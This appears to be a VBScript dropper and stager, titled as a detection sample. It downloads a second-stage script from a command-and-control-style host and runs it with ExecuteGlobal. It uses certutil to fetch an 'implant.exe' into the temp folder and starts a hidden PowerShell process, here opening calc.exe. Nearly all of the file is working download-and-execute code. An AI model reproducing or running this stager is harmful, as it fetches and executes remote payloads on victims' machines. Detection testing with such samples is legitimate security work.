' =====================================================================
' Ultimate Detection VBScript Dropper & Stager
' =====================================================================

Dim wsh, http, fso, payloadUrl, tempPath
Set wsh = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")
Set fso = CreateObject("Scripting.FileSystemObject")

payloadUrl = "https://threat-c2-infrastructure.net/stage2.vbs"
http.Open "GET", payloadUrl, False
http.Send

If http.Status = 200 Then
    ' Dynamic execution of downloaded payload
    ExecuteGlobal http.responseText
End If

' Launch LOLBin with hidden console
wsh.Run "certutil.exe -urlcache -split -f http://threat-c2.net/implant.exe %TEMP%\implant.exe", 0, True
wsh.Run "powershell.exe -w hidden -c calc.exe", 0, False
